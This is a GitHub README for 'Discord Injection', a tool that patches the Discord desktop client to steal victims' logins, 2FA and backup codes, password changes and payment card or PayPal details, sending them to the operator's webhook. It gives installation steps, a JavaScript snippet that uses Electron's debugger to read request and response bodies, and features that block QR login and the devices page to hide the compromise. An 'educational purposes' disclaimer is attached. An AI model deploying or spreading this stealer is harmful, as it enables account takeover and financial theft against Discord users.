<h1 align="center">
  Discord Injection 💉
</h1>

<p align="center">
   Discord HTTP requests interception POC, including backup codes request and many others !
</p>

## Features
- Intercept login, register and 2FA login requests
- Intercept backup codes requests
- Intercept email/password changes requests
- Intercept credit card/paypal adding
- Logout user after initial injection
- Block usage of QR Code to login
- Block request to see devices

## Installation
- Completely close Discord
- Copy the [injection code](https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js) inside your Discord desktop core:

`%APPDATA%\Local\Discord\app-<app-version>\modules\discord_desktop_core-<core-version>\discord_desktop_core\index.js`

- Replace `%WEBHOOK%` by your Discord webhook. The informations intercepted will be sent this way.
- Restart Discord

## Preview
### Backup codes sniffing
![image](./assets/codes.png)
### Devices blocking
![image](./assets/devices.png)

## How does backup codes sniffing work ?
I use the [debugger](https://www.electronjs.org/docs/latest/api/debugger) instead of the [WebRequests instance methods](https://www.electronjs.org/docs/latest/api/web-request#instance-methods). It allow me to get request body AND response body:

```js
mainWindow.webContents.debugger.on('message', async (_, method, params) => {
    if (method !== 'Network.responseReceived') return;
    if (![200, 202].includes(params.response.status)) return;

    const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
        requestId: params.requestId
    });
    const responseData = JSON.parse(responseUnparsedData.body);

    const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
        requestId: params.requestId
    });
    const requestData = JSON.parse(requestUnparsedData.postData);
})
```
The backup codes are in the response body of `/mfa/codes-verification` request

## Contributing
If you wish to contribute to this project, kindly open an issue or submit a pull request with your proposed changes. We warmly welcome contributions from the community.

## Enjoying the Project?
- Leave a Star 🌟: Click on the star button at the top of the GitHub repository to show your appreciation.
- Follow me on GitHub: Stay updated with the latest developments by following my GitHub profile.
- Donate ☕: If you're feeling generous and would like to contribute financially, you can donate to help sustain and improve this project. Every little bit helps!

<a href='https://ko-fi.com/hackirby'><img src='https://storage.ko-fi.com/cdn/kofi3.png' width=150></a>

## License
This project is licensed under the MIT License. For more information, please consult the LICENSE file.

## Disclaimer:

### Important Notice:
This injection is inteded for educational purposes only. This is provided strictly for educational and research purposes. Under no circumstances this should be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.

### Usage Responsibility:

By accessing and using this injection, you acknowledge that you are solely responsible for your actions. Any misuse of this injection is strictly prohibited, and the creator (hackirby) disclaims any responsibility for how this injection is utilized. You are fully accountable for ensuring that your usage complies with all applicable laws and regulations in your jurisdiction.

### No Liability:

The creator (hackirby) of this injection shall not be held responsible for any damages or legal consequences resulting from the use or misuse of this software. This includes, but is not limited to, direct, indirect, incidental, consequential, or punitive damages arising out of your access, use, or inability to use this injection.

### No Support:

The creator (hackirby) will not provide any support, guidance, or assistance related to the misuse of this injection. Any inquiries regarding malicious activities will be ignored.

### Acceptance of Terms:

By using this injection, you signify your acceptance of this disclaimer. If you do not agree with the terms stated in this disclaimer, do not use this injection.

